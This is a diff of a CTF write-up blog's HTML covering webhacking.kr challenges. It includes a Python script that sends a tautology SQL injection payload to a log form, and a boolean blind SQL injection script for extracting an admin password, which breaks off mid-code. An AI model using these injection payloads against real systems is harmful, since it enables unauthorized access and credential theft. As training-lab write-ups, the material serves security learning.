@@ -615,125 +615,6 @@ MySQL JSON 文档保留重复 key，后续
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-03/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-03/" class="post-title-link" itemprop="url">Webhacking.kr old-03</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-09-26 12:55:47" itemprop="dateCreated datePublished" datetime="2026-09-26T12:55:47+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>369</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Solve the Nonogram, then alter the hidden <code>answer</code> field
-in the log request.</p>
-<p>解出 5×5 Nonogram，并提交网格编码。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-03/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p>页面把 25 个格子编码为 <code>_1</code> 到 <code>_25</code>，黑格为
-<code>1</code>、白格为 <code>0</code>，JavaScript 再按顺序拼成 hidden
-字段 <code>_answer</code>。解题后出现的日志表单通过 POST 提交
-<code>answer</code> 和 <code>id</code>；<code>answer</code>
-会进入查询，而 <code>id</code> 只决定日志中的名字。观察到修改
-<code>answer</code>
-会改变查询结果后，可以在该字段结束原字符串并追加恒真条件。</p>
-<p>5×5 网格按行编码如下：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10101</span><br><span class="line">00000</span><br><span class="line">01110</span><br><span class="line">01010</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>
-<p>按行拼接后得到：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1010100000011100101011111</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>先用完整网格参数打开 challenge，让服务端进入 Clear
-页面；随后复用同一个 session，向日志表单提交 SQL
-injection。下面的脚本包含两个请求和所有字段：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD03_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-03/&quot;</span></span><br><span class="line">)</span><br><span class="line">GRID = &#123;</span><br><span class="line">    <span class="string">&quot;_1&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_2&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_3&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_4&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_5&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_6&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_7&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_8&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_9&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_10&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_11&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_12&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_13&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_14&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_15&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_16&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_17&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_18&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_19&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_20&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_21&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_22&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_23&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_24&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_25&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_answer&quot;</span>: <span class="string">&quot;1010100000011100101011111&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">INJECTION = <span class="string">&quot;&#x27; or 1=1-- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        clear = session.get(BASE_URL, params=GRID, timeout=<span class="number">10</span>)</span><br><span class="line">        clear.raise_for_status()</span><br><span class="line">        result = session.post(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;answer&quot;</span>: INJECTION, <span class="string">&quot;id&quot;</span>: <span class="string">&quot;writeup&quot;</span>&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        result.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
-<p><code>--</code> 后面的空格是 payload
-的一部分，用于注释查询剩余内容。<code>answer</code> 必须作为 POST
-字段发送，不能只把它放在初始 Nonogram 的 GET 参数中。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-05/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1192,6 +1073,125 @@ payload。<code>CLIENT_IP</code>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-03/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-03/" class="post-title-link" itemprop="url">Webhacking.kr old-03</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-26 12:55:47" itemprop="dateCreated datePublished" datetime="2026-09-26T12:55:47+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>369</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Solve the Nonogram, then alter the hidden <code>answer</code> field
+in the log request.</p>
+<p>解出 5×5 Nonogram，并提交网格编码。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-03/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>页面把 25 个格子编码为 <code>_1</code> 到 <code>_25</code>，黑格为
+<code>1</code>、白格为 <code>0</code>，JavaScript 再按顺序拼成 hidden
+字段 <code>_answer</code>。解题后出现的日志表单通过 POST 提交
+<code>answer</code> 和 <code>id</code>；<code>answer</code>
+会进入查询，而 <code>id</code> 只决定日志中的名字。观察到修改
+<code>answer</code>
+会改变查询结果后，可以在该字段结束原字符串并追加恒真条件。</p>
+<p>5×5 网格按行编码如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10101</span><br><span class="line">00000</span><br><span class="line">01110</span><br><span class="line">01010</span><br><span class="line">11111</span><br></pre></td></tr></table></figure>
+<p>按行拼接后得到：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1010100000011100101011111</span><br></pre></td></tr></table></figure>
+<h3 id="solution">Solution</h3>
+<p>先用完整网格参数打开 challenge，让服务端进入 Clear
+页面；随后复用同一个 session，向日志表单提交 SQL
+injection。下面的脚本包含两个请求和所有字段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD03_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-03/&quot;</span></span><br><span class="line">)</span><br><span class="line">GRID = &#123;</span><br><span class="line">    <span class="string">&quot;_1&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_2&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_3&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_4&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_5&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_6&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_7&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_8&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_9&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_10&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_11&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_12&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_13&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_14&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_15&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_16&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_17&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_18&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_19&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_20&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_21&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_22&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_23&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_24&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_25&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_answer&quot;</span>: <span class="string">&quot;1010100000011100101011111&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">INJECTION = <span class="string">&quot;&#x27; or 1=1-- &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        clear = session.get(BASE_URL, params=GRID, timeout=<span class="number">10</span>)</span><br><span class="line">        clear.raise_for_status()</span><br><span class="line">        result = session.post(</span><br><span class="line">            BASE_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;answer&quot;</span>: INJECTION, <span class="string">&quot;id&quot;</span>: <span class="string">&quot;writeup&quot;</span>&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        result.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(result.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
+<p><code>--</code> 后面的空格是 payload
+的一部分，用于注释查询剩余内容。<code>answer</code> 必须作为 POST
+字段发送，不能只把它放在初始 Nonogram 的 GET 参数中。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-11/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1310,7 +1310,7 @@ Tab。正则只要求匹配，不要求前缀或五个字母取特定值。</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-20/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-21/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1328,7 +1328,7 @@ Tab。正则只要求匹配，不要求前缀或五个字母取特定值。</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-20/" class="post-title-link" itemprop="url">Webhacking.kr old-20</a>
+          <a href="/wp/webhacking/old-21/" class="post-title-link" itemprop="url">Webhacking.kr old-21</a>
         </h2>
 
         <div class="post-meta-container">
@@ -1358,14 +1358,14 @@ Tab。正则只要求匹配，不要求前缀或五个字母取特定值。</p>
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>244</span>
+      <span>419</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
+      <span>2 mins.</span>
     </span>
 </div>
 
@@ -1378,20 +1378,27 @@ Tab。正则只要求匹配，不要求前缀或五个字母取特定值。</p>
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>Submit the captcha before the two-second deadline.</p>
-<p>在两秒时限内提交验证码。</p>
+<p>Extract the admin password from the blind SQL injection oracle.</p>
+<p>通过 blind SQL injection oracle 提取 admin 密码。</p>
 </blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/code-4/</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-1/</span><br></pre></td></tr></table></figure>
 <h3 id="analysis">Analysis</h3>
-<p>GET 响应同时给出本次页面实例的 captcha 和 <code>st</code>
-Cookie。服务端用 <code>st</code> 判断时限，并要求 POST 的 captcha
-与本次页面生成的值相同；因此 GET 和 POST 必须使用同一个
-<code>requests.Session</code>。不能预先保存验证码，也不能把下一次 GET
-得到的 <code>st</code> 与旧验证码混用。</p>
+<p>登录结果提供了一个布尔 oracle：查询条件成立但提交的密码不匹配时返回
+<code>wrong password</code>，条件不成立时返回
+<code>login fail</code>。把注入放在 <code>id</code>
+参数中，先闭合原来的引号，再限定 <code>id='admin'</code>，就能逐次测试
+<code>length(pw)</code> 和
+<code>ascii(substr(pw, position, 1))</code>。</p>
+<p>脚本使用 <code>--</code>
+注释服务端拼接在输入后的引号；<code>requests</code>
+会负责对参数中的引号和空格做 URL
+编码。每个猜测都单独请求，响应文本只用于判断真或假。</p>
 <h3 id="solution">Solution</h3>
-<p>下面的脚本完整完成一次 GET、解析 captcha、复用 Cookie 并构造
-POST。它只打印响应，不包含账号或固定 session 值：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://webhacking.kr/challenge/code-4/&quot;</span></span><br><span class="line">CAPTCHA_PATTERN = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&quot;&lt;input[^&gt;]+name=[\&quot;&#x27;]?captcha_[\&quot;&#x27;]?[^&gt;]+value=[\&quot;&#x27;]([^\&quot;&#x27;]+)[\&quot;&#x27;]&quot;</span>,</span><br><span class="line">    re.IGNORECASE,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_captcha</span>(<span class="params">html</span>):</span><br><span class="line">    <span class="keyword">match</span> = CAPTCHA_PATTERN.search(html)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;captcha input was not found&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_once</span>():</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        response = session.get(URL, timeout=<span class="number">10</span>)</span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        captcha = extract_captcha(response.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;st&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session.cookies:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;st cookie was not set by the GET response&quot;</span>)</span><br><span class="line"></span><br><span class="line">        post_response = session.post(</span><br><span class="line">            URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;demo&quot;</span>, <span class="string">&quot;cmt&quot;</span>: <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;captcha&quot;</span>: captcha&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        post_response.raise_for_status()</span><br><span class="line">        <span class="keyword">return</span> post_response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    result = solve_once()</span><br><span class="line">    <span class="built_in">print</span>(result.status_code)</span><br><span class="line">    <span class="built_in">print</span>(result.text)</span><br></pre></td></tr></table></figure>
+<p>下面的脚本先枚举长度，再枚举每个字符，随后用得到的密码构造一次正常登录请求：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;https://webhacking.kr/challenge/bonus-1/&quot;</span></span><br><span class="line">TRUE_MARKER = <span class="string">&quot;wrong password&quot;</span></span><br><span class="line">FALSE_MARKER = <span class="string">&quot;login fail&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">session, condition</span>):</span><br><span class="line">    injection = <span class="string">f&quot;admin&#x27; and (<span class="subst">&#123;condition&#125;</span>) or &#x27;1&#x27;=&#x27;0&#x27; -- &quot;</span></span><br><span class="line">    response = session.get(</span><br><span class="line">        URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;id&quot;</span>: injection, <span class="string">&quot;pw&quot;</span>: <span class="string">&quot;probe&quot;</span>&#125;,</span><br><span class="line">        timeout=<span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    body = response.text.lower()</span><br><span class="line">    <span class="keyword">if</span> TRUE_MARKER <span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> FALSE_MARKER <span class="keyword">in</span> body:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;response did not contain a known oracle marker&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_password</span>(<span class="params">session</span>):</span><br><span class="line">    password_length = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">for</span> length <span 